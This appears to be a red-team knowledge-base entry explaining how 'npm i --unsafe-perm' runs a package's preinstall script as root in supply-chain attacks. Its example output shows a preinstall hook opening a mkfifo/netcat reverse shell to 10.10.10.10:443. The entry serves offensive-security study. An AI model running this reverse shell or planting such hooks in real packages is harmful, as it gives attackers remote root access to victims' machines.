---
id: 117268c7-a771-473c-8253-ec2e6a64997e
name: npm-install-package-with-preinstall-scripts
type: command
executor: bash
data: npm i $PACKAGE --unsafe-perm
output: >-
  root@kali:# npm i /home/alice/pwnme --unsafe-perm


  > pwnme@1.0.0 preinstall /home/alice/pwnme

  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443
  >/tmp/f


  npm WARN pwnme@1.0.0 No description

  npm WARN pwnme@1.0.0 No repository field.


  up to date in 46.635s

  found 0 vulnerabilities
created_at: '2019-10-31T22:50:53.761328+00:00'
updated_at: '2024-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - execution
  - npm
verified: true
validated: true
---

# npm-install-package-with-preinstall-scripts

## Command

```bash
npm i $PACKAGE --unsafe-perm
```

## Description

This command installs a specified npm package from a local path or registry and executes any preinstall scripts defined in its package.json. The --unsafe-perm flag bypasses npm's default restrictions on running scripts under elevated privileges (e.g., as root), enabling the execution of potentially malicious code in supply chain attack scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $PACKAGE | Path to the package directory or package name from registry | Yes |
| --unsafe-perm | Allows package scripts to run with the effective UID/GID of the owner, bypassing root restrictions | Yes (for elevated installs) |
| i | Alias for 'install' | Built-in |

## Examples

### Basic Usage

```bash
npm i ./malicious-package --unsafe-perm
```

### Advanced Usage

```bash
npm i /path/to/package --unsafe-perm --save
```

> The --save flag adds the package as a dependency in package.json, but for testing malicious payloads, a local path is often sufficient.

## Expected Output

Description of what output to expect when the command runs successfully.

```
root@kali:# npm i /home/alice/pwnme --unsafe-perm

> pwnme@1.0.0 preinstall /home/alice/pwnme
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f

npm WARN pwnme@1.0.0 No description
npm WARN pwnme@1.0.0 No repository field.

up to date in 46.635s
found 0 vulnerabilities
```

> The preinstall script executes automatically, but output may be minimal. Monitor for side effects like network connections (e.g., reverse shells) or file changes to confirm payload activation.

## Related

- [[procedures/Create-Malicious-NodeJS-NPM-Package]]
